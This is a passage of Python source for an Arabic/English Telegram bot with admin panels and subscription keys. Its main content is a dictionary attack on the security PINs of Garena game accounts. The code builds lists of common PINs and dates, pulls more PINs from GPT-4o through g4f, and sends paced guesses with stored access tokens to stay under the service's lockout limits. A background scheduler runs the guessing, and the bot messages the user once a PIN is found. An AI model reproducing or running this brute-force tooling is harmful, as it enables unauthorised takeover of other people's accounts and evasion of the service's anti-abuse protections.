    if data == "adm_list_keys" and is_admin:
        keys = KeyManager.get_all()
        if not keys:
            msg = "📭 <b>لا توجد أي مفاتيح نشطة حالياً في قاعدة البيانات!</b>" if lang == LANG_AR else "📭 <b>No active keys found in the database!</b>"
        else:
            msg = "📋 <b>قائمة المفاتيح المفعّلة والنشطة بالسيستم:</b>\n" if lang == LANG_AR else "📋 <b>Active Database Keys List:</b>\n"
            msg += "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            for k, v in list(keys.items())[:20]:
                status = "🟢" if v.get("active", True) else "🔴"
                users_count = len(v.get("users", []))
                max_dev = v.get("max_devices", 5)
                expires_at = v.get("expires_at", "")
                try:
                    dt = datetime.fromisoformat(expires_at)
                    remaining = dt - datetime.now()
                    if remaining.total_seconds() > 0:
                        days = remaining.days
                        hours, remainder = divmod(remaining.seconds, 3600)
                        minutes, _ = divmod(remainder, 60)
                        time_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة" if lang == LANG_AR else f"{days}d {hours}h {minutes}m"
                    else:
                        time_str = "منتهي 🔴" if lang == LANG_AR else "Expired 🔴"
                except:
                    time_str = "غير معروف" if lang == LANG_AR else "Unknown"
                msg += f"• {status} <code>{k}</code>\n  👥 الأجهزة: ({users_count}/{max_dev}) | ⏱️ المتبقي: <b>{time_str}</b>\n\n"
        
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع لوحة التحكم" if lang == LANG_AR else "↩️ Back", callback_data="btn_admin_panel", style="primary")]])
        await smart_edit(query, msg, keyboard)
        return

    if data == "adm_kick_user" and is_admin:
        context.user_data["state"] = "adm_awaiting_kick_id"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt_lbl = "👤 <b>طرد مستخدم عبر المعرّف:</b>\n\nأرسل الآيدي الرقمي لعضو تليجرام لإلغاء جميع مفاتيح تفعيله وفصله فوراً:" if lang == LANG_AR else "👤 <b>Kick user out via ID:</b>\n\nSend Telegram User ID to detach and cancel their subscription:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_add_admin" and user_id == OWNER_ID:
        context.user_data["state"] = "adm_awaiting_admin_id"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt_lbl = "➕ <b>إضافة أدمن ومسؤول جديد للبوت:</b>\n\nأرسل الآيدي الرقمي الخاص بالعضو لتضمينه كمسؤول له صلاحيات متوسطة:" if lang == LANG_AR else "➕ <b>Add new admin via ID:</b>\n\nSend Telegram User ID to promote them as a moderator:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_broadcast" and is_admin:
        context.user_data["state"] = "adm_awaiting_broadcast_text"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء" if lang == LANG_AR else "❌ Cancel", callback_data="btn_admin_panel", style="danger")]])
        prompt_lbl = "📢 <b>بث جماعي للأعضاء:</b>\n\nأرسل نص الرسالة التي ترغب في إرسالها لكل مشتركي البوت الآن:" if lang == LANG_AR else "📢 <b>Broadcast globally:</b>\n\nSend the message you want to broadcast to all members:"
        await smart_edit(query, prompt_lbl, keyboard)
        return

    if data == "adm_json_log" and is_admin:
        if user_id != OWNER_ID:
            alert_msg = "❌ عذراً، هذا الإجراء الحساس متاح فقط لمالك البوت الرئيسي!" if lang == LANG_AR else "❌ Sorry, this critical action is restricted to the main Owner only!"
            try:
                await query.answer(alert_msg, show_alert=True)
            except:
                pass
            return

        log_json = DataManager.generate_json_log()
        bio = BytesIO(log_json.encode('utf-8'))
        bio.name = "users_log.json"
        caption_lbl = "📋 <b>تم إنتاج وتصدير ملف سجل المستخدمين والحسابات بنجاح!</b>" if lang == LANG_AR else "📋 <b>Users database exported successfully!</b>"
        await context.bot.send_document(
            chat_id=user_id,
            document=bio,
            caption=caption_lbl,
            parse_mode="HTML"
        )
        return

    if data == "adm_stats" and is_admin:
        keys_db = DataManager.get_keys()
        users_db = DataManager.get_users()
        active_keys = sum(1 for k in keys_db.values() if k.get("active", True))
        total_accounts = sum(len(u.get("accounts", {})) for u in users_db.values())
        
        msg = get_txt("stats_title", lang).format(
            keys_total=len(keys_db),
            keys_active=active_keys,
            users_total=len(users_db),
            accounts_total=total_accounts
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع" if lang == LANG_AR else "↩️ Back", callback_data="btn_admin_panel", style="primary")]])
        await smart_edit(query, msg, keyboard)
        return

# ============================================================
# INSTANT SMART GUESSING RUNNER
# ============================================================
async def run_guessing_for_account(bot, uid: str, aid: str) -> None:
    users = DataManager.get_users()
    uinfo = users.get(str(uid))
    if not uinfo:
        return
    acc = uinfo.get("accounts", {}).get(aid)
    if not acc or not acc.get("guessing_active", False):
        return

    today_str = datetime.now().strftime("%Y-%m-%d")

    eat_token = acc.get("EAT") or acc.get("ACCESS_TOKEN")
    err_token, token_data = await garena.eat_to_token(eat_token)
    if not err_token and token_data.get("access_token"):
        acc["ACCESS_TOKEN"] = token_data["access_token"]
        DataManager.save_users(users)

    email, _, _, _ = await garena.get_bind_info(acc["ACCESS_TOKEN"])
    if not email:
        acc["guessing_active"] = False
        DataManager.save_users(users)
        try:
            await bot.send_message(
                chat_id=int(uid),
                text=f"⚠️ تم إيقاف التخمين الذكي على حساب <b>{acc['NAME']}</b> لعدم وجود بريد إلكتروني مربوط حالياً.",
                parse_mode="HTML"
            )
        except:
            pass
        return

    acc_date = acc.get("last_guess_date", "")
    if acc_date != today_str:
        acc["last_guess_date"] = today_str
        acc["guesses_today_count"] = 0
        DataManager.save_users(users)

    today_guesses = acc.get("guesses_today_count", 0)
    if today_guesses >= 10:
        return

    max_to_try = 10 - today_guesses

    for _ in range(max_to_try):
        users = DataManager.get_users()
        acc = users.get(str(uid), {}).get("accounts", {}).get(aid)
        if not acc or not acc.get("guessing_active", False):
            break

        pin_idx = acc.get("pin_index", 0)
        pin = get_pin_by_index(pin_idx)

        success, text_res, identity_token = await garena.verify_identity_sec(email, acc["ACCESS_TOKEN"], pin)

        if "error_login_limit" in text_res or "limit" in text_res.lower():
            acc["guesses_today_count"] = 10
            acc["last_guess_date"] = today_str
            DataManager.save_users(users)
            try:
                await bot.send_message(
                    chat_id=int(uid),
                    text=f"⚠️ <b>نظام الطوارئ (تفادي البان) الفعّال:</b>\n\nاكتشف البوت أن خادم جارينا أرجع خطأ <code>error_login_limit</code> لحسابك <b>{acc['NAME']}</b>.\nتم تجميد التخمين تلقائياً لمدة 24 ساعة لحماية التوكن من الاحتراق والبان.",
                    parse_mode="HTML"
                )
            except:
                pass
            break

        acc["pin_index"] = pin_idx + 1
        acc["guesses_today_count"] = acc.get("guesses_today_count", 0) + 1
        acc["last_guess_date"] = today_str
        DataManager.save_users(users)

        if success and identity_token:
            acc["guessing_active"] = False
            DataManager.save_users(users)
            msg = (
                f"🎉 <b>خبر مفرح لقد تم ايجاد رمز حساب</b>\n\n"
                f"👤 اسم الحساب: <b>{acc['NAME']}</b>\n"
                f"🔑 الرمز: <code>{pin}</code>\n"
                f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
            )
            try:
                await bot.send_message(chat_id=int(uid), text=msg, parse_mode="HTML")
            except:
                pass
            break

        await asyncio.sleep(10)

# ============================================================
# SMART DICTIONARY ATTACK SYSTEM
# ============================================================
def generate_smart_dictionary() -> list:
    easy_universal = [
        "123456", "654321", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999",
        "123123", "321321", "112233", "332211", "121212", "101010", "123321", "321123", "987654", "456789", "135790", "246800"
    ]
    
    patterns = [
        "111222", "222111", "000111", "111000", "123450", "010203", "102030", "147258", "369258", "258369", 
        "951753", "159357", "753951", "123457", "111122", "222211", "000011", "121234", "123412"
    ]
    
    birth_standalone = []
    for y in range(1985, 2016):
        ys = str(y)
        birth_standalone.append(f"00{ys}")
        birth_standalone.append(f"{ys}00")
        birth_standalone.append(f"01{ys}")
        birth_standalone.append(f"12{ys}")
        birth_standalone.append(f"20{ys}")
        birth_standalone.append(f"19{ys}")

    date_month = []
    for y in range(1990, 2012):
        ys = str(y)[2:]
        for m in range(1, 13):
            for d in [1, 5, 10, 15, 20, 25]:
                date_month.append(f"{d:02d}{m:02d}{ys}")
                date_month.append(f"{m:02d}{d:02d}{ys}")

    combined = easy_universal + patterns + birth_standalone + date_month
    seen = set()
    final_list = [x for x in combined if not (x in seen or seen.add(x)) if len(x) == 6 and x.isdigit()]
    return final_list

def get_pin_by_index(index: int) -> str:
    if index < len(SMART_DICTIONARY):
        return SMART_DICTIONARY[index]
    return f"{index:06d}"[:6]

async def enrich_dictionary_with_g4f(existing_list: list) -> list:
    try:
        import g4f
        prompt = "Give me 50 of the most common 6-digit numeric codes/pins used by people. Output only as a JSON array of strings: [\"123456\", ...]"
        
        response = await asyncio.wait_for(
            asyncio.to_thread(
                g4f.ChatCompletion.create,
                model=g4f.models.gpt_4o,
                messages=[{"role": "user", "content": prompt}]
            ),
            timeout=10.0
        )
        match = re.search(r'\[.*\]', response, re.DOTALL)
        if match:
            ai_pins = json.loads(match.group(0))
            for pin in ai_pins:
                pin = str(pin).strip()
                if len(pin) == 6 and pin.isdigit() and pin not in existing_list:
                    existing_list.append(pin)
    except Exception as e:
        print(f"G4F Dictionary Enrichment skipped/failed or timed out: {e}")
    return existing_list

SMART_DICTIONARY = generate_smart_dictionary()

# ============================================================
# BACKGROUND CRON-LIKE SCHEDULER
# ============================================================
async def background_guessing_task(bot) -> None:
    print("🧠 Smart Guessing Scheduler is running...")
    while True:
        try:
            users = DataManager.get_users()
            today_str = datetime.now().strftime("%Y-%m-%d")
            
            for uid, uinfo in list(users.items()):
                accounts = uinfo.get("accounts", {})
                for aid, acc in list(accounts.items()):
                    if acc.get("guessing_active", False):
                        guesses_today = acc.get("guesses_today_count", 0)
                        acc_date = acc.get("last_guess_date", "")
                        
                        if acc_date != today_str or guesses_today < 10:
                            asyncio.create_task(run_guessing_for_account(bot, uid, aid))
        except Exception as e:
            print(f"⚠️ Error in background guessing task: {e}")
            
        await asyncio.sleep(600)

async def post_init(application: Application) -> None:
    global SMART_DICTIONARY
    SMART_DICTIONARY = await enrich_dictionary_with_g4f(SMART_DICTIONARY)
    asyncio.create_task(background_guessing_task(application.bot))

# ============================================================
# APPLICATION RUNNER
# ============================================================
def run_telegram_bot():
    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("loginstatus", cmd_login_status))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_inputs))
    application.add_handler(CallbackQueryHandler(handle_callback_queries))
    
    print(f"⚡ ♛𝒀𝑨𝑺𝑰𝑵♛ Bot Running ({DEV_NAME}) is starting...")
    application.run_polling()

if __name__ == "__main__":
    run_telegram_bot()